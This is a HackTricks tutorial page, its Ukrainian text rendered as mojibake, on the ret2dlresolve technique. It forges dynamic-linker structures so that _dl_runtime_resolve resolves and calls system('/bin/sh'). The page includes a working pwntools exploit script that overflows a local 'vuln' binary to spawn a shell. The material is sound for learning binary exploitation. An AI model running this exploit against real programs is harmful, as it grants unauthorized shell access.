# Ret2dlresolve

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

–Ø–∫ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –ø—Ä–æ [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) —Ç–∞ [**Relro**](../common-binary-protections-and-bypasses/relro.md), –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏ –±–µ–∑ Full Relro –±—É–¥—É—Ç—å —Ä–æ–∑–≤'—è–∑—É–≤–∞—Ç–∏ —Å–∏–º–≤–æ–ª–∏ (—è–∫ –∞–¥—Ä–µ—Å–∏ –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫) –ø—ñ–¥ —á–∞—Å —ó—Ö –ø–µ—Ä—à–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è. –¶–µ —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó **`_dl_runtime_resolve`**.

–§—É–Ω–∫—Ü—ñ—è **`_dl_runtime_resolve`** –æ—Ç—Ä–∏–º—É—î –∑—ñ —Å—Ç–µ–∫—É –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –¥–µ—è–∫—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏, —è–∫—ñ —ó–π –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–ª—è —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è –≤–∫–∞–∑–∞–Ω–æ–≥–æ —Å–∏–º–≤–æ–ª—É.

–û—Ç–∂–µ, –º–æ–∂–ª–∏–≤–æ **–ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –≤—Å—ñ —Ü—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏**, —â–æ–± –¥–∏–Ω–∞–º—ñ—á–Ω–æ –∑–≤'—è–∑–∞—Ç–∏ –∑–∞–ø–∏—Ç—É–≤–∞–Ω–∏–π —Å–∏–º–≤–æ–ª (—è–∫ —Ñ—É–Ω–∫—Ü—ñ—é **`system`**) —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —ó—ó –∑ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **`system('/bin/sh')`**).

–ó–∞–∑–≤–∏—á–∞–π –≤—Å—ñ —Ü—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –ø—ñ–¥—Ä–æ–±–ª—è—é—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ ROP-–ª–∞–Ω—Ü—é–≥–∞, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î `read`** –Ω–∞–¥ –∑–∞–ø–∏—Å—É–≤–∞–Ω–æ—é –ø–∞–º'—è—Ç—Ç—é, –ø–æ—Ç—ñ–º **—Å—Ç—Ä—É–∫—Ç—É—Ä–∏** —Ç–∞ —Ä—è–¥–æ–∫ **`'/bin/sh'`** –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è, —â–æ–± —ó—Ö –∑–±–µ—Ä–µ–≥—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é read —É –≤—ñ–¥–æ–º–æ–º—É –º—ñ—Å—Ü—ñ, –∞ –ø–æ—Ç—ñ–º ROP-–ª–∞–Ω—Ü—é–≥ –ø—Ä–æ–¥–æ–≤–∂—É—î—Ç—å—Å—è –≤–∏–∫–ª–∏–∫–æ–º **`_dl_runtime_resolve`** –∑ –∞–¥—Ä–µ—Å–æ—é –¥–æ `$'/bin/sh'`.

{% hint style="success" %}
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω–∞, —è–∫—â–æ –Ω–µ–º–∞—î syscall gadgets (–¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫, —Ç–∞–∫–∏—Ö —è–∫ [**ret2syscall**](rop-syscall-execv.md) –∞–±–æ [SROP](srop-sigreturn-oriented-programming.md)) —ñ –Ω–µ–º–∞—î —Å–ø–æ—Å–æ–±—ñ–≤ –≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å libc.
{% endhint %}

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫—Ä–∞—â–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –≤ –¥—Ä—É–≥—ñ–π –ø–æ–ª–æ–≤–∏–Ω—ñ –≤—ñ–¥–µ–æ:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Structures

–ù–µ–æ–±—Ö—ñ–¥–Ω–æ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ 3 —Å—Ç—Ä—É–∫—Ç—É—Ä–∏: **`JMPREL`**, **`STRTAB`** —Ç–∞ **`SYMTAB`**. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫—Ä–∞—â–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è –ø—Ä–æ —Ç–µ, —è–∫ –≤–æ–Ω–∏ –±—É–¥—É—é—Ç—å—Å—è, –∑–∞ –∞–¥—Ä–µ—Å–æ—é [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## Attack Summary

1. –ó–∞–ø–∏—Å–∞—Ç–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –≤ —è–∫–µ—Å—å –º—ñ—Å—Ü–µ
2. –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç —Å–∏—Å—Ç–µ–º–∏ (`$rdi = &'/bin/sh'`)
3. –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –Ω–∞ —Å—Ç–µ–∫ –∞–¥—Ä–µ—Å–∏ –¥–æ —Å—Ç—Ä—É–∫—Ç—É—Ä –¥–ª—è –≤–∏–∫–ª–∏–∫—É **`_dl_runtime_resolve`**
4. **–í–∏–∫–ª–∏–∫–∞—Ç–∏** `_dl_runtime_resolve`
5. **`system`** –±—É–¥–µ —Ä–æ–∑–≤'—è–∑–∞–Ω–æ —ñ –≤–∏–∫–ª–∏–∫–∞–Ω–æ –∑ `'/bin/sh'` —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç

## Example

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø—Ä–∏–∫–ª–∞–¥ —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —Ç—É—Ç**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **–∑ –¥—É–∂–µ —Ö–æ—Ä–æ—à–∏–º –ø–æ—è—Å–Ω–µ–Ω–Ω—è–º —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ ROP-–ª–∞–Ω—Ü—é–≥–∞**, –∞–ª–µ –æ—Å—å —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
